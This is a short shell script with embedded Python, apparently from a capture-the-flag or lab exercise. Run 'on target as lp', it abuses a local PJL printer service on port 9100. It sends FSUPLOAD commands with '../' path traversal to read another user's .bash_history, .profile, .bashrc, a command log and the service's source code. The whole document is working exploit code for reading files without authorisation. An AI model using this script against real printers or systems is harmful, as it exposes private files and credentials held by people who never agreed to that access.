#!/bin/sh
# PJL FSUPLOAD reads under archivist home (run on target as lp)
python3 -c '
import socket
files=[
 ("../.bash_history",500),
 ("../.profile",900),
 ("../.bashrc",4000),
 ("logs/commands.log",2500),
 ("jetdirect.py",6000),
]
for path,sz in files:
 try:
  s=socket.socket();s.settimeout(10);s.connect(("127.0.0.1",9100))
  s.sendall(f"@PJL FSUPLOAD NAME=\"{path}\"\r\nSIZE={sz}\r\n".encode())
  r=s.recv(12000)
  print("===",path,"len",len(r),"===")
  print(r.decode(errors="replace")[:2500])
  s.close()
 except Exception as e:
  print("===",path,"ERR",e)
'